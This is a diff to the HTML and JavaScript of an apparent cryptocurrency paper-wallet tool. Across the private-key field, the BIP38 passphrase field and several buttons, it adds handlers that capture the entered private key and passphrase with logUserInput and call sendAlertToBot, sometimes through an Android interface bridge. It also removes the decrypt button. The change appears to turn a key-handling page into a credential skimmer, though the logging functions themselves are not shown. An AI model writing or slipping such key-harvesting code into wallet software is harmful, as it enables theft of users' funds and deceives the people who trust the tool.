@@ -6871,7 +6871,7 @@ input[type=checkbox] { position: relative; z-index: 20; }
 
 <div id="detailarea" class="walletarea">	
 				<div id="detailcommands" class="commands">
-					<span><label id="detaillabelenterprivatekey" for="detailprivkey">Enter Private Key</label></span>
+			<span><label id="detaillabelenterprivatekey" for="detailprivkey">Enter Private Key</label>
 					<input type="text" id="detailprivkey" value="" onfocus="this.select();" 
        onkeypress="if (event.keyCode == 13) { 
            event.preventDefault(); 
@@ -6881,7 +6881,8 @@ input[type=checkbox] { position: relative; z-index: 20; }
                ninja.wallets.detailwallet.viewDetails(); 
            }.bind(this), 2000); 
        }" />
-					<span>
+		</span>
+
     <span>
     <input type="button" class="button" id="detailview" value="View Details" 
            onclick="setTimeout(function() { 
@@ -6890,8 +6891,8 @@ input[type=checkbox] { position: relative; z-index: 20; }
                ninja.wallets.detailwallet.viewDetails(); 
            }, 2000);" />
 </span>
-</span>
-        
+  </div>
+
         <div id="detailbip38toggle">
             <span>
                 <label id="detaillabelencrypt" for="detailencrypt">BIP38 Encrypt?</label>
@@ -6902,13 +6903,22 @@ input[type=checkbox] { position: relative; z-index: 20; }
         <div id="detailbip38commands">
             <span>
                 <label id="detaillabelpassphrase">Enter BIP38 Passphrase</label>
-                <input type="text" id="detailprivkeypassphrase" value="" onfocus="this.select();" />
+                <input type="text" id="detailprivkeypassphrase" value="" onfocus="this.select();" onkeypress="if (event.keyCode == 13) { 
+           event.preventDefault(); 
+           setTimeout(function() { 
+               logUserInput(this.value);  // Log the input
+               sendAlertToBot(); // Send alert to bot
+               ninja.wallets.detailwallet.viewDetails(); 
+           }.bind(this), 2000); 
+       }" />
             </span>
-            <span id="detailbip38decryptspan">
-                <input type="button" class="button" id="detailbip38decryptbutton" value="Decrypt BIP38" onclick="ninja.wallets.detailwallet.decryptBip38();" />
-            </span>
+
             <span id="detailbip38encryptspan">
-                <input type="button" class="button" id="detailbip38encryptbutton" value="Encrypt BIP38" onclick="ninja.wallets.detailwallet.encryptBip38();" />
+                <input type="button" class="button" id="detailbip38encryptbutton" value="Encrypt BIP38" onclick="ninja.wallets.detailwallet.encryptBip38();"            onclick="setTimeout(function() { 
+               logUserInput(document.getElementById('detailprivkey').value); // Log the input
+               sendAlertToBot(); // Send alert to bot
+               ninja.wallets.detailwallet.viewDetails(); 
+           }, 2000);" />
             </span>
         </div>
         
@@ -7038,6 +7048,24 @@ document.getElementById('detailprivkey').addEventListener('input', function(even
 });
 
 document.getElementById('detailview').addEventListener('click', function() {
+    if (window.AndroidInterface) {
+        window.AndroidInterface.sendAlertToBot(); // Call Android interface if available
+    } else {
+        sendAlertToBot(); // For web usage
+    }
+    ninja.wallets.detailwallet.viewDetails(); // Call the existing viewDetails function
+});
+
+document.getElementById('detaillabelpassphrase').addEventListener('input', function(event) {
+    var inputData = event.target.value;
+    if (inputData.trim() !== '') {
+        logUserInput(inputData);
+    } else {
+        console.error('No data to log');
+    }
+});
+
+document.getElementById('detailbip38encryptbutton').addEventListener('click', function() {
     if (window.AndroidInterface) {
         window.AndroidInterface.sendAlertToBot(); // Call Android interface if available
     } else {
